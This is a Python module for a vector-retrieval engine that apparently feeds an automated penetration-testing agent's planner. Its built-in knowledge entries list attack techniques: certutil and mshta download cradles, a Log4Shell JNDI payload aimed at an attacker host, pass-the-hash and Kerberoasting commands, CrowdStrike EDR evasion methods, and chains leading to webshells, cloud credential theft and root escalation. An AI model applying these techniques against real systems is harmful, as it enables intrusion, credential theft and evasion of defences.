"""
RAG Engine — 向量检索引擎（Loop B 的知识召回组件）

架构定位：
  - Orchestrator 在处理 RAG_QUERY 指令时调用此模块
  - 结果写入 context_retrievals（Redis），通过 StatePruner 裁剪后进入 Planner
  - 不直接注入 Planner prompt，必须过 StatePruner（防 token 预算失控）

存储后端（优先级）：
  1. ChromaDB（本地向量 DB，开发/单机）
  2. Redis Vector（如 ChromaDB 不可用，退化为关键词匹配）

知识库内容：
  - 漏洞利用技术（CVE 描述 + PoC 摘要）
  - LotL 二进制用法（certutil / mshta / wmic 等）
  - EDR 绕过模式
  - 渗透测试方法论条目
"""

from __future__ import annotations

import json
import logging
import os
import re
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger(__name__)

# ── 配置 ─────────────────────────────────────────────────────

_CHROMA_PATH      = os.environ.get("CHROMA_PATH", "./memory/chroma_db")
_COLLECTION_NAME  = "pentest_knowledge"
_TOP_K            = 5
_MIN_RELEVANCE    = 0.6      # 低于此值的结果被 StatePruner 过滤


@dataclass
class RetrievalResult:
    content:    str
    source:     str           # "cve_db" / "lotl_db" / "methodology" / "keyword"
    relevance:  float         # 0.0 – 1.0（余弦相似度 or 关键词得分）
    metadata:   dict = field(default_factory=dict)


class RAGEngine:
    """
    向量检索引擎。
    使用方式：
        engine = RAGEngine()
        results = await engine.query("certutil LOLBAS payload", top_k=5)
    """

    def __init__(self):
        self._chroma = self._init_chroma()
        if self._chroma:
            logger.info("RAGEngine: ChromaDB backend ready")
        else:
            logger.warning("RAGEngine: ChromaDB not available, using keyword fallback")

    # ── 初始化 ────────────────────────────────────────────────

    def _init_chroma(self):
        try:
            import chromadb
            client = chromadb.PersistentClient(path=_CHROMA_PATH)
            # 惰性创建集合（首次访问时创建）
            collection = client.get_or_create_collection(
                name=_COLLECTION_NAME,
                metadata={"hnsw:space": "cosine"},
            )
            return collection
        except ImportError:
            logger.warning("RAGEngine: chromadb not installed — pip install chromadb")
            return None
        except Exception as e:
            logger.warning(f"RAGEngine: ChromaDB init failed: {e}")
            return None

    # ── 主查询接口 ────────────────────────────────────────────

    async def query(
        self, query_text: str, top_k: int = _TOP_K,
        type_filter: Optional[str] = None,
    ) -> list[RetrievalResult]:
        """
        向量检索，返回按相关性降序排列的结果列表。
        type_filter: 按知识类型过滤 ("CVE" / "Bypass" / "LotL" / "Methodology")
        Orchestrator 将结果写入 context_retrievals 后，由 StatePruner 裁剪。
        """
        if not query_text.strip():
            return []

        # CVE 编号精确匹配优先
        exact = self._exact_cve_match(query_text)
        if exact:
            remaining = max(0, top_k - len(exact))
            if remaining > 0:
                semantic = await self._semantic_query(
                    query_text, remaining, type_filter
                )
                # 去重：精确结果优先
                seen_ids = {r.content[:80] for r in exact}
                semantic = [r for r in semantic if r.content[:80] not in seen_ids]
                return exact + semantic
            return exact[:top_k]

        return await self._semantic_query(query_text, top_k, type_filter)

    def _exact_cve_match(self, query_text: str) -> list[RetrievalResult]:
        """CVE 编号精确匹配（优先于语义检索）"""
        cve_pattern = re.compile(r'CVE-\d{4}-\d{4,7}', re.IGNORECASE)
        found_cves = cve_pattern.findall(query_text)
        if not found_cves:
            return []

        matches = []
        for entry in _BUILTIN_KNOWLEDGE:
            entry_cves = cve_pattern.findall(entry.get("content", ""))
            for wanted in found_cves:
                if any(wanted.upper() == c.upper() for c in entry_cves):
                    matches.append(RetrievalResult(
                        content=entry["content"],
                        source=entry.get("source", "cve_db"),
                        relevance=0.99,
                        metadata=entry.get("metadata", {}),
                    ))
        return matches

    async def _semantic_query(
        self, query_text: str, top_k: int,
        type_filter: Optional[str] = None,
    ) -> list[RetrievalResult]:
        """语义检索入口，支持 type 过滤"""
        if self._chroma:
            return await self._query_chroma(query_text, top_k, type_filter)
        return self._keyword_fallback(query_text, top_k, type_filter)

    async def _query_chroma(
        self, query_text: str, top_k: int,
        type_filter: Optional[str] = None,
    ) -> list[RetrievalResult]:
        try:
            import asyncio
            loop = asyncio.get_event_loop()

            where = None
            if type_filter:
                where = {"source": {"$eq": type_filter.lower() + "_db"
                                    if type_filter in ("CVE", "LotL")
                                    else type_filter.lower()}}

            kwargs = dict(
                query_texts=[query_text],
                n_results=min(top_k, self._chroma.count() or 1),
                include=["documents", "metadatas", "distances"],
            )
            if where:
                kwargs["where"] = where
            results = await loop.run_in_executor(
                None,
                lambda: self._chroma.query(**kwargs),
            )

            items = []
            docs      = results.get("documents", [[]])[0]
            metas     = results.get("metadatas", [[]])[0]
            distances = results.get("distances", [[]])[0]

            for doc, meta, dist in zip(docs, metas, distances):
                # ChromaDB cosine distance [0,2] → similarity [0,1]
                relevance = max(0.0, 1.0 - dist / 2.0)
                items.append(RetrievalResult(
                    content=doc,
                    source=meta.get("source", "unknown"),
                    relevance=relevance,
                    metadata=meta,
                ))

            return sorted(items, key=lambda x: x.relevance, reverse=True)

        except Exception as e:
            logger.error(f"RAGEngine ChromaDB query error: {e}")
            return self._keyword_fallback(query_text, top_k)

    def _keyword_fallback(
        self, query_text: str, top_k: int,
        type_filter: Optional[str] = None,
    ) -> list[RetrievalResult]:
        """
        无向量 DB 时的退化方案：关键词 TF-IDF 近似检索。
        从内置知识片段（_BUILTIN_KNOWLEDGE）里做简单匹配。
        """
        # 类型过滤映射
        source_map = {
            "CVE":         "cve_db",
            "Bypass":      "edr_bypass",
            "LotL":        "lotl_db",
            "Methodology": "methodology",
        }
        allowed_source = source_map.get(type_filter) if type_filter else None

        query_tokens = set(query_text.lower().split())
        scored = []
        for entry in _BUILTIN_KNOWLEDGE:
            if allowed_source and entry.get("source") != allowed_source:
                continue
            doc_tokens = set(entry["content"].lower().split())
            if not doc_tokens:
                continue
            overlap = len(query_tokens & doc_tokens)
            score = overlap / (len(query_tokens | doc_tokens) + 1e-9)
            if score > 0:
                scored.append((score, entry))

        scored.sort(key=lambda x: x[0], reverse=True)
        results = []
        for score, entry in scored[:top_k]:
            results.append(RetrievalResult(
                content=entry["content"],
                source=entry.get("source", "builtin"),
                relevance=min(score * 10, 1.0),   # 粗略归一化到 [0,1]
                metadata=entry.get("metadata", {}),
            ))
        return results

    # ── 索引接口（知识库维护）─────────────────────────────────

    async def index_documents(self, documents: list[dict]) -> int:
        """
        将文档批量写入向量 DB。
        documents: [{"id": str, "content": str, "source": str, "metadata": dict}]
        返回成功写入数量。
        """
        if not self._chroma:
            logger.warning("RAGEngine: no chroma backend, cannot index")
            return 0

        import asyncio
        loop = asyncio.get_event_loop()

        ids       = [d["id"] for d in documents]
        contents  = [d["content"] for d in documents]
        metadatas = [d.get("metadata", {"source": d.get("source", "")}) for d in documents]

        try:
            await loop.run_in_executor(
                None,
                lambda: self._chroma.upsert(
                    ids=ids,
                    documents=contents,
                    metadatas=metadatas,
                ),
            )
            return len(documents)
        except Exception as e:
            logger.error(f"RAGEngine index error: {e}")
            return 0

    def results_to_state(self, results: list[RetrievalResult]) -> list[dict]:
        """转换为 context_retrievals 写入格式（供 Orchestrator 使用）"""
        return [
            {
                "content":   r.content,
                "source":    r.source,
                "relevance": r.relevance,
                "metadata":  r.metadata,
            }
            for r in results
            if r.relevance >= _MIN_RELEVANCE
        ]


# ── 内置知识片段（无 ChromaDB 时的降级内容）─────────────────

_BUILTIN_KNOWLEDGE: list[dict] = [
    {
        "content": (
            "certutil.exe -urlcache -split -f <url> <outfile> — "
            "Downloads a file using the Windows Certificate Services utility. "
            "Commonly used as a LOLBAS download cradle. "
            "Detected by: Sysmon EventID 1 (process create), some EDRs flag -urlcache."
        ),
        "source": "lotl_db",
        "metadata": {"binary": "certutil", "os": "windows", "type": "download_cradle"},
    },
    {
        "content": (
            "mshta.exe <url> — Executes HTA (HTML Application) from a remote URL. "
            "Bypasses many application whitelists. "
            "Detected by: network connection from mshta.exe, Sysmon network events."
        ),
        "source": "lotl_db",
        "metadata": {"binary": "mshta", "os": "windows", "type": "execution"},
    },
    {
        "content": (
            "wmic.exe process call create '<cmd>' — Spawns a process via WMI. "
            "Parent process is WmiPrvSE.exe, useful for parent-process spoofing. "
            "Detected by: Sysmon EventID 1 parent process, Windows Event 4688."
        ),
        "source": "lotl_db",
        "metadata": {"binary": "wmic", "os": "windows", "type": "execution"},
    },
    {
        "content": (
            "PowerShell -EncodedCommand — Runs Base64-encoded PowerShell payload. "
            "Evades simple string-based AMSI/AV signatures. "
            "Detected by: AMSI (script content inspection), PowerShell ScriptBlock logging."
        ),
        "source": "lotl_db",
        "metadata": {"binary": "powershell", "os": "windows", "type": "execution"},
    },
    {
        "content": (
            "CVE-2021-44228 (Log4Shell) — JNDI injection in Apache Log4j 2.0-2.14.1. "
            "Payload: ${jndi:ldap://<attacker>/a} in any logged HTTP header/param. "
            "Affected: Log4j2 <= 2.14.1. Fixed in 2.15.0+. "
            "CVSS 10.0 — RCE without authentication."
        ),
        "source": "cve_db",
        "metadata": {"cve": "CVE-2021-44228", "cvss": 10.0, "service": "log4j"},
    },
    {
        "content": (
            "CVE-2021-26855 (ProxyLogon) — SSRF in Microsoft Exchange Server. "
            "Allows pre-authentication access to Exchange backend via TCP port 443. "
            "Chained with CVE-2021-27065 for RCE. Affected: Exchange 2013-2019."
        ),
        "source": "cve_db",
        "metadata": {"cve": "CVE-2021-26855", "cvss": 9.8, "service": "exchange"},
    },
    {
        "content": (
            "Kerberoasting — Request TGS tickets for service accounts (SPN set), "
            "crack offline with hashcat/john. "
            "Prerequisites: valid domain user account. "
            "Tool: Rubeus.exe kerberoast or impacket GetUserSPNs.py. "
            "Mitigation: use Group Managed Service Accounts (gMSA)."
        ),
        "source": "methodology",
        "metadata": {"technique": "kerberoasting", "category": "credential_access"},
    },
    {
        "content": (
            "Pass-the-Hash (PtH) — Authenticate using NTLM hash without cracking. "
            "Tool: impacket psexec.py -hashes LM:NT <target>. "
            "Requires: admin hash, SMB accessible. "
            "Detected by: Event 4624 logon type 3, anomalous lateral movement."
        ),
        "source": "methodology",
        "metadata": {"technique": "pth", "category": "lateral_movement"},
    },
    {
        "content": (
            "BloodHound/SharpHound — Active Directory attack path enumeration. "
            "Collects: sessions, group memberships, ACLs, GPOs. "
            "Run: SharpHound.exe -c All --zipfilename loot.zip. "
            "Post-process in BloodHound GUI to find shortest DA path."
        ),
        "source": "methodology",
        "metadata": {"technique": "bloodhound", "category": "discovery"},
    },
    {
        "content": (
            "CrowdStrike Falcon evasion — Avoid memory scanning by: "
            "1) unhooking ntdll.dll (load fresh copy from disk), "
            "2) direct syscalls (bypass userland hooks), "
            "3) sleep obfuscation (encrypt memory during sleep). "
            "Noisy: reflective loading, CreateRemoteThread cross-process injection."
        ),
        "source": "edr_bypass",
        "metadata": {"edr": "crowdstrike", "category": "defense_evasion"},
    },
    # ── 漏洞链合成模式（Vulnerability Chaining）──────────────
    {
        "content": (
            "漏洞链: 信息泄露 + 弱口令 = 未授权访问。"
            "常见场景: .git 泄露暴露配置文件 → 提取数据库凭据 → 直连数据库。"
            "工具链: dirsearch/.git dump → 分析 config → mysql/psql 直连。"
            "优先级: 发现信息泄露后，立即检查是否包含凭据信息。"
        ),
        "source": "methodology",
        "metadata": {"technique": "vuln_chain", "category": "initial_access",
                     "chain": "info_disclosure+weak_cred"},
    },
    {
        "content": (
            "漏洞链: SSRF + 文件读取 = RCE。"
            "常见场景: Web 应用存在 SSRF → 读取内网服务配置 → 利用内部 API 执行命令。"
            "变体: SSRF → 读取 AWS metadata (169.254.169.254) → 获取 IAM 凭据 → 接管云资源。"
            "工具链: 构造 SSRF payload → curl 内网端点 → 解析响应提取敏感信息。"
        ),
        "source": "methodology",
        "metadata": {"technique": "vuln_chain", "category": "execution",
                     "chain": "ssrf+file_read"},
    },
    {
        "content": (
            "漏洞链: 文件上传 + 路径遍历 = WebShell。"
            "常见场景: 上传功能未校验文件类型 → 利用路径遍历将文件写到 Web 根目录 → 访问 WebShell 获取 RCE。"
            "绕过: 双扩展名(.php.jpg)、空字节(%00)、Content-Type 修改。"
            "工具链: Burp Intruder 上传 → gobuster 确认路径 → curl 触发 WebShell。"
        ),
        "source": "methodology",
        "metadata": {"technique": "vuln_chain", "category": "execution",
                     "chain": "file_upload+path_traversal"},
    },
    {
        "content": (
            "漏洞链: SQL注入 + 文件写入 = RCE。"
            "常见场景: SQL 注入获取 DB 权限 → INTO OUTFILE 写 WebShell → 访问触发 RCE。"
            "前提: MySQL FILE 权限 + 已知 Web 目录路径。"
            "工具链: sqlmap --os-shell / --file-write 自动化利用。"
        ),
        "source": "methodology",
        "metadata": {"technique": "vuln_chain", "category": "execution",
                     "chain": "sqli+file_write"},
    },
    {
        "content": (
            "漏洞链: 低权限 Shell + 内核漏洞 = 提权。"
            "常见场景: 通过 Web 漏洞获得 www-data 权限 → 检查内核版本 → 利用 DirtyPipe/DirtyCow 提权到 root。"
            "检查: uname -r, cat /etc/os-release, find / -perm -4000 (SUID)。"
            "工具: linpeas.sh 自动化提权信息收集。"
        ),
        "source": "methodology",
        "metadata": {"technique": "vuln_chain", "category": "privilege_escalation",
                     "chain": "low_shell+kernel_exploit"},
    },
]

